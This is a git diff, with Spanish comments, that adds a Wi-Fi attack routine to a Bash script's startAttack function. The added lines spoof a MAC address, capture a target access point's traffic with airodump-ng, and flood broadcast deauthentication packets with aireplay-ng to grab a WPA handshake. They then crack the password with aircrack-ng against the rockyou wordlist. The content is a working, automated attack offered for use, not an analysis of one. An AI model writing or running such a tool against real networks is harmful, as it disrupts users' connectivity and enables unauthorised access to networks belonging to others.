@@ -73,6 +73,27 @@ function startAttack {
 
 	echo -e "${yellowColor}[*]${endColor}${greyColor} Nueva dirección MAC asignada ${endColor}${purpleColor}[${endColor}${blueColor}$(macchanger -s ${network_card}mon | grep -i current | xargs | cut -d ' ' -f '3-10')${endColor}${purpleColor}]${endColor}"
 
+	# poner targeta en modo monitor
+	xterm -hold -e "airodump-ng ${network_card}mon" &
+	# captura del proceso ID *Tenga en cuenta que $! solo captura PID en segundo plano*
+	airodump_xterm_PID=$!
+
+	echo -ne "${yellowColor}[*]${endColor}${greyColor} Nombre del punto de acceso: ${endColor}" && read app_name
+	echo -ne "${yellowColor}[*]${endColor}${greyColor} Canal del punto de acceso: ${endColor}" && read app_chanel
+	# matar proceso airodump
+	sleep 10; kill -9 $airodump_xterm_PID; wait $airodump_xterm_PID >& /dev/null
+	# filtrar
+	xterm -hold -e "airodump-ng -c $app_chanel -w Captura --essid $app_name ${network_card}mon" &
+	# recuperar proceso ID 
+	airodump_filter_xterm_PID=$!
+
+	sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $app_name -c FF:FF:FF:FF:FF:FF ${network_card}" &
+	arieplay_xterm_PID=$!
+	sleep 10; kill -9 $arieplay_xterm_PID; wait $arieplay_xterm_PID >& /dev/null
+	sleep 10; kill -9 $airodump_filter_xterm_PID; wait $airodump_filter_xterm_PID >& /dev/null
+	# Romper cifrado contraseña
+	xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
+
 }
 
 
